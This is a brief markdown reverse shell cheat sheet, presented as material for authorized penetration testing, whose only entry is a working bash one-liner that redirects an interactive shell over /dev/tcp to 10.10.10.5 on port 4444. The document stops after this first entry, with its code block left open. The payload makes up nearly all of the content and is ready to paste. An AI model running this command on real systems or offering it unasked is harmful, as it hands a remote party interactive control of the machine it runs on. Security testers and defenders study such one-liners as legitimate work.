# Reverse Shell Cheat Sheet

Standard one-liners utilized during authorized penetration testing to establish reverse interactive loops.

## 1. Bash Reverse Shells
```bash
bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
